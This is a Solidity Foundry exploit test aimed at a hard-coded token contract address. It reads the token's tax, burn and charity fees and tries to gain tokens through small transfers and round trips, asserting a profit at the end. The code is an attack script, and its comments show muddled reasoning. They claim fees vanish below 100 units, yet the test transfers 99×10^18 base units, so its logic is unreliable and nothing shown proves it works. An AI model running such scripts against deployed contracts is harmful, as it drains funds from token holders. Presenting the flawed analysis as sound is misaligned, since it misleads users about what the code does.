pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface honeyToken {
    function _TAX_FEE() external view returns (uint256);
    function _BURN_FEE() external view returns (uint256);
    function _CHARITY_FEE() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal to get tokens
        attacker = address(this);
        // Get some initial tokens to work with
        deal(TARGET, attacker, 1000 * 10**18);  // Assuming 18 decimals
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        // First, let's check the current fee rates
        (uint256 taxFee, uint256 burnFee, uint256 charityFee) = (honeyToken(TARGET)._TAX_FEE(), honeyToken(TARGET)._BURN_FEE(), honeyToken(TARGET)._CHARITY_FEE());

        console.log("Tax fee:", taxFee);
        console.log("Burn fee:", burnFee);
        console.log("Charity fee:", charityFee);

        // For a 1% fee, taxFee would be 100 (1 * 100)
        // The calculation is: tFee = ((tAmount * taxFee) / 100) / 100
        // So if taxFee = 100 (1%), then tFee = (tAmount * 100 / 100) / 100 = tAmount / 100
        // This should never be 0 for tAmount > 0... wait

        // Actually, let me recalculate:
        // taxFee = _txFee * 100, so if _txFee = 1 (1%), taxFee = 100
        // tFee = ((tAmount * 100) / 100) / 100 = tAmount / 100
        // So for tAmount < 100, tFee = 0!

        // Let's test with a small amount
        uint256 testAmount = 99 * 10**18;  // 99 tokens
        uint256 attackerInitialBalance = IERC20(TARGET).balanceOf(attacker);

        // Create a recipient address
        address recipient = address(0x123);

        // Transfer a small amount
        IERC20(TARGET).transfer(recipient, testAmount);

        // Check if fees were taken
        uint256 attackerFinalBalance = IERC20(TARGET).balanceOf(attacker);
        uint256 expectedBalance = attackerInitialBalance - testAmount;

        console.log("Initial balance:", attackerInitialBalance);
        console.log("Final balance:", attackerFinalBalance);
        console.log("Expected balance (if no fees):", expectedBalance);
        console.log("Difference:", attackerFinalBalance - expectedBalance);

        // If finalBalance > expectedBalance, it means less was deducted than expected
        // Actually, we should check the recipient's balance
        uint256 recipientBalance = IERC20(TARGET).balanceOf(recipient);
        console.log("Recipient received:", recipientBalance);
        console.log("Expected recipient amount (if no fees):", testAmount);

        // For the exploit to work, we need to end up with more tokens
        // Let's try a different approach: transfer back and forth
        if (recipientBalance == testAmount) {
            // Transfer back from recipient
            vm.prank(recipient);
            IERC20(TARGET).transfer(attacker, recipientBalance);

            uint256 newBalance = IERC20(TARGET).balanceOf(attacker);
            console.log("Balance after round trip:", newBalance);
            console.log("Profit:", newBalance - attackerInitialBalance);
        }

        // Actually, the real issue might be that when fees are 0,
        // the reflection accounting doesn't update properly
        // Let's check the reflection rate before and after
        // We can't directly access private variables, but we can see the effect
        // through balance calculations
        uint256 finalBalanceCheck = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        assertGt(finalBalanceCheck, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

